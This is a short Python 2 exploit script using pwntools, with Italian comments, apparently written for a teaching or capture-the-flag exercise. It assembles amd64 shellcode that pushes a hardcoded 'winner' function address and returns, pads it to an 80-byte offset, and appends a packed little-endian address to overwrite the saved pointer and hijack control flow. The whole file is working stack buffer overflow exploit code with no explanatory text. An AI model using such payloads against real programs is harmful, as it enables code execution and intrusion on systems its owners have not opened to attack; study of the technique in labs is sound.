import pwnlib
import struct

DATA_ADDR = 0x7ffff7ef6010
WINNER_ADDR = 0x400abd

pwnlib.context.arch = 'amd64'
# push ADDR
shellcode = pwnlib.shellcraft.amd64.push(WINNER_ADDR)
# ret
shellcode += pwnlib.shellcraft.amd64.ret()

# assembla lo shellcode per architettura amd64
shellcode = pwnlib.asm.asm(shellcode, arch='amd64')

# offset tra fp e buf e' di 80 caratteri
buf = shellcode + "A" * (80 - len(shellcode)) 
#restituisce l'indirizzo DATA_ADDR come un 
#unsigned long long, Little Endian
buf += struct.pack("<Q", DATA_ADDR)

print buf